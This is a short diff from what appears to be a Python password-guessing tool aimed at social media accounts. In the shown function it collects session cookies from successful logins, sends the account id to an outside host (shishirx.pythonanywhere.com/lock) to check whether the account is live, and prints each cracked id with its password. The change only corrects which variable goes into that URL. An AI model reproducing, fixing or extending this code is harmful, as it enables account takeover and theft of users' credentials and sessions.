@@ -1368,7 +1368,7 @@ def rndmx(ids,pasx,tl):
                         if 'session_key' in po:
                                 uid = po['uid']
                                 coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
-                                url = f"https://shishirx.pythonanywhere.com/lock?uid={user}"
+                                url = f"https://shishirx.pythonanywhere.com/lock?uid={uid}"
                                 reqx = requests.get(url).text
                                 if 'live' in reqx:
                                         print(f'\r\r{G}[ATOM-OK]: {uid} | {pas}')
